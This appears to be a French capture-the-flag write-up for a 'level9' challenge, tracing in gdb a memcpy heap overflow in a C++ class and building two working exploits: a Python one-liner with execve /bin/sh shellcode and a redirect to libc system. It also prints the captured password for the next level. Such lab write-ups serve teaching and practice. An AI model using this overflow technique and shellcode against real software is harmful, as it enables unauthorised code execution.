@@ -1,0 +1,153 @@
+On à un programme level9, qui ne semble rien faire lorsqu'on le lance.
+
+Dans Gdb, on trouve quelque fonctions intéressante: 
+
+(gdb) info functions
+    ...
+    0x080485f4  main
+    0x080486f6  N::N(int)
+    0x080486f6  N::N(int)
+    0x0804870e  N::setAnnotation(char*)
+    0x0804873a  N::operator+(N&)
+    0x0804874e  N::operator-(N&)
+    ...
+On devine que le programme est ici écrit en C++, et que le code comporte une classe N, qui comporte entre autre deux opérateur, et une fonction setAnnotation.
+
+En analysant le main, on trouve plusieurs call de fonctions:
+(gdb) disas main
+    ...
+    0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+    0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>                   => appelle à une fonction de librairie qui correspond à new() voir $ c++filt _Znwj
+    0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>                   => correspond à la classe N::N(int)  voir (gdb) disas 'N::N(int)' 
+    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>     => correspond à la fonction N::setAnnotation(char *) voir (gdb) disas 'N::setAnnotation(char *)' 
+    0x08048693 <+159>:	call   *%edx                                   => x/i $edx -> 0x804873a <_ZN1NplERS_>:	push   %ebp => correspond à l'appele de fonction _ZN1NplERS_, c'est a dire N::operator+(N&), voir (gdb) disas 'N::operator+(N&)' 
+    ...
+
+On ne voit pour l'instant aucun élément qui pourrait nous aider dans la résolution de notre problème, ni de fgets, ni d'appelle system ou autre.
+Analysons la fonction de la classe N:
+
+(gdb)  disas 'N::setAnnotation(char *)'
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:	push   %ebp
+   0x0804870f <+1>:	mov    %esp,%ebp
+   0x08048711 <+3>:	sub    $0x18,%esp
+   0x08048714 <+6>:	mov    0xc(%ebp),%eax
+   0x08048717 <+9>:	mov    %eax,(%esp)
+   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:	mov    0x8(%ebp),%edx
+   0x08048722 <+20>:	add    $0x4,%edx
+   0x08048725 <+23>:	mov    %eax,0x8(%esp)
+   0x08048729 <+27>:	mov    0xc(%ebp),%eax
+   0x0804872c <+30>:	mov    %eax,0x4(%esp)
+   0x08048730 <+34>:	mov    %edx,(%esp)
+   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:	leave  
+   0x08048739 <+43>:	ret    
+End of assembler dump.
+
+Voilà qui pourrait nous être utile, un memcpy.
+Il semble copier l'argument envoyé au programme:
+
+(gdb) b *0x08048733  (au niveau du memcpy)
+(gdb) run AAAA
+    Starting program: /home/user/level9/level9 AAAA
+    Breakpoint 1, 0x08048733 in N::setAnnotation(char*) ()
+(gdb) x/s $eax
+    0xbffff8fe:	 "AAAA"
+
+On peut donc chercher à faire un overflow:
+
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    Program received signal SIGSEGV, Segmentation fault.
+    0x08048682 in main ()
+(gdb) info registers
+    eax            0x41366441	1094083649
+    ecx            0x67413567	1732326759
+    edx            0x804a0d4	134521044
+    ebx            0x804a078	134520952
+    esp            0xbffff640	0xbffff640
+    ebp            0xbffff668	0xbffff668
+
+On peut voir que eax a été overflow par le caractère situé à la 108 position.
+
+Etant donné que le programme fini par "call *%edx" et que edx prend un peu plus haut la valeur du registre eax :
+   0x08048682 <+142>:	mov    (%eax),%edx
+
+on comprend qu'on peut exploiter cet overflow de eax:
+Il faut donc faire en sorte que edx = addresse qui renvoit vers un system(/bin/sh).
+
+Pour ce qui est du code d'execution de /bin/sh, on prendra un shell code, trouvé ici:
+ https://shell-storm.org/shellcode/files/shellcode-811.html
+
+On peut être tenté d'écrire directement: 
+108 * "A" + shell_code.
+C'est d'ailleurs ce qu'on a fait mais le programme va segfault avant d'arriver au call de *%edx.
+En effet : 
+   0x08048680 <+140>:	mov    (%eax),%eax
+Cette ligne va prendre (%eax), pour le mettre dans le registre de %eax, c'est à dire que ça va prendre le contenu de ce que pointe %eax pour le mettre dans le registre.
+Si on met directement le shellcode à la suite de l'overflow, on a vu que c'était eax qui était override, et donc ce qui sera contenu dans $eax sera égale au début du shell_code, 0x6850c031.
+Or cette addresse n'est pas directement accessible par les registres pendant l'éxecution du programme:
+ (gdb) x/wx 0x6850c031
+0x6850c031:	Cannot access memory at address 0x6850c031
+
+Pour passer cette étape, il faut donc donner une addresse qui soit accessible, et qui pointe elle même vers notre shell code.
+Or le seul endroit où l'on peut écrire notre shell_code sera dans le buffer. Il faut donc placer dans eax grace à l'override, l'addresse du début de notre buffer.
+Ainsi lors de l'éxecution de:
+    mov    (%eax),%eax
+%eax sera égale à l'addresse du buffer (0x...)
+et (%eax) sera égale à ce que pointe l'addresse de %eax, c'est à dire ce que pointe l'adresse du buffer, donc notre shell_code.
+Ce que fera le move, c'est qu'il mettra ce que contient l'addresse de %eax dans %eax. Donc au lieu d'avoir l'addresse du buffer, il aura désormais son contenu.
+
+Trouvons donc l'addresse de départ de notre buffer:
+
+(gdb) b *0x08048738    (juste après le memcpy)
+(gdb) run AAAABBBB
+    Starting program: /home/user/level9/level9 AAAABBBB
+    Breakpoint 1, 0x08048738 in N::setAnnotation(char*) ()
+(gdb) x/wx $sp
+    0xbffff6e0:	0x0804a00c   -> la dernière addresse de la stack après le memcpy
+(gdb) x/wx 0x0804a00c
+    0x804a00c:	0x41414141   -> elle contient bien notre input.
+
+L'addresse du debut du buffer est donc 0x804a00c
+
+Maintenant que nous savons cela, on va tenter de réaliser l'overflow ainsi :
+
+shell_code de system(/bin/sh) + le restant de bytes pour atteindre 108 + addresse du debut du buffer (0x804a00c)
+
+Mais encore une fois ça va échouer, tout simplement pour la même raison que précédement: il y a un autre déréférencement :
+   0x08048682 <+142>:	mov    (%eax),%edx
+Cette fois ci, on va prendre ce que pointe $eax pour le mettre dans le registre de edx. Mais comme juste avant, on a pris ce qui était pointé par eax pour le mettre dans eax,
+c'est le debut de notre buffer et donc le debut de notre shell code qui est maintenant dans eax. 
+Et donc comme précédemment, il va essayer d'aller regarder ce que pointe 0x6850c031 (le debut de notre shell code) et ce n'est pas accessible par le programme.
+Donc il faut à nouveau mettre au début de notre buffer une nouvelle addresse, qui pointera vers notre shell code.
+
+Comme notre shell code fait 28 octets et que il y a 108 octets d'espaces libre avant de faire segfault le programme,
+on a largement la place de mettre notre shell_code un peu plus loin dans notre buffer, et de mettre au debut du buffer l'addresse qui pointera vers celui ci.
+
+Cela donnera :
+
+adresse du shell_code + shell_code + le restant d'octet pour atteindre 108 + addresse du début du buffer.
+
+On va mettre le shell_code juste après l'addresse qui pointera dessus. Une addresse fait 4 octets, notre shell_code sera donc 
+4 octets plus loin que le début du buffer
+0x804a00c -> 0x804a00d | 0x804a00e | 0x804a00f | 0x804a010
+
+$ ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x08\x04\xa0\x0c"[::-1]')
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+
+
+autre solution :
+(gdb) p system
+    b7d86060
+on a une addresse system dans un librairie. Pour le deuxième référencement, on peut rediriger vers la fonctions systeme de la librairie, plutot que de rediriger vers une
+addresse plus loin du buffer ou se trouve un shellcode.
+De plus : 
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:	mov    0x10(%esp),%eax
+On a ici une sauvegarde de 0x10(%esp) dans EAX juste après le memcpy. Cela signifie qu'il va push dans EAX, les 16 octets qui suivent dans la stack, ce qui signifie qu'on peut stocker 
+un éventuelle parametre ici, qui sera envoyé plus tard dans *%edx, c'est à dire vers notre appelle system. On peut ainsi mettre notre /bin/sh.
+
+./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "A" * 104 + "\x08\x04\xa0\x0c"[::-1] + "&/bin/sh"')
